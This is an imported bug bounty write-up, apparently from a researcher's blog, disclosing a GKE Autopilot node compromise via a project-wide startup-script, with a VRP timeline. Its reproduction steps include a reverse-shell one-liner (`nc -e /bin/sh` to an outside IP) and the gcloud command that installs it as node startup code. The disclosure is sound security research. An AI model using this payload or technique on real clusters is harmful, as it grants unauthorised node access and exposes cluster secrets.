---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-05_gke-autopilot-node-compromise-via-startup-script.md
original_filename: 2021-03-05_gke-autopilot-node-compromise-via-startup-script.md
title: GKE Autopilot Node Compromise via startup-script
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: eb79229a3d870d451e503c39044d6bee05355e2de36b652f0ec5de70c76b9858
text_sha256: 087e78d95bcfab7f0ff6bfcca31cd23a12f5f564907a47af69cca3fd89944cb9
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# GKE Autopilot Node Compromise via startup-script

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-05_gke-autopilot-node-compromise-via-startup-script.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `eb79229a3d870d451e503c39044d6bee05355e2de36b652f0ec5de70c76b9858`
- Text SHA256: `087e78d95bcfab7f0ff6bfcca31cd23a12f5f564907a47af69cca3fd89944cb9`


## Content

---
title: "GKE Autopilot Node Compromise via startup-script"
page_title: "GKE Autopilot Node Compromise via startup-script | Anthony Weems"
url: "https://lf.lc/vrp/181521559b/"
final_url: "https://amlw.dev/vrp/181521559b/"
authors: ["Anthony Weems"]
programs: ["Google"]
bugs: ["Container escape"]
bounty: "1,337"
publication_date: "2021-03-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3839
---

#  GKE Autopilot Node Compromise via startup-script 

March 5, 2021

### Vulnerability Details#

GKE Autopilot provides many default security controls to protect the node, including protections against privileged pods and limitations on hostPath volume mounts.

The Autopilot nodes do not have a startup-script defined in their instance metadata. As documented [here](https://cloud.google.com/compute/docs/startupscript), a user with `compute.projects.setCommonInstanceMetadata` can set a project-wide startup script. Since the nodes do not have this attribute set, they will use the project-wide attribute and allow arbitrary code execution from the startup-script. To demonstrate:

  1. Create a script with your desired code (e.g. `nc -e /bin/sh 1.2.3.4 4444`) and save as `script.sh`
  2. Set project-wide startup-script

  
  
  gcloud compute project-info add-metadata --metadata-from-file startup-script=script.sh
  

  3. Create an autopilot cluster and observe that the `startup-script` executes when the nodes boot.

### Attack Scenario#

The Autopilot documentation describes the motivation for its security controls as:

> In order for GKE to offer management of the nodes and provide you with a more streamlined operational experience, there are a few restrictions and limitations when compared to GKE Standard. Some of these limitations are security best practices, while others allow Autopilot clusters to be safely managed.

A user with the `compute.projects.setCommonInstanceMetadata` permissions in the project could bypass the security controls in the cluster and gain privileged access to the managed Kubernetes nodes. Using this access, they could read all secrets in the cluster (including those outside their provisioned access) or explore the attack surface of the Autopilot control plane.

### Timeline#

  * 2021-03-01: Initial report to Google VRP
  * 2021-03-01: Issue triaged
  * 2021-03-04: Internal bug report filed
  * 2021-03-05: Additional variants reported ([vrp/181521559b](/vrp/181521559b), [vrp/181521559c](/vrp/181521559c))
  * 2021-03-09: Internal bug report updated
  * 2021-04-01: Additional variant reported ([vrp/181521559d](/vrp/181521559d))
  * 2021-04-06: Internal bug report updated
  * 2021-04-08: VRP issued reward ($1337 per variant)
  * 2021-06-07: Issue reported fixed
  * 2021-09-10: Retested and verified only variant “a” is fixed
  * 2021-09-11: Issue reopened
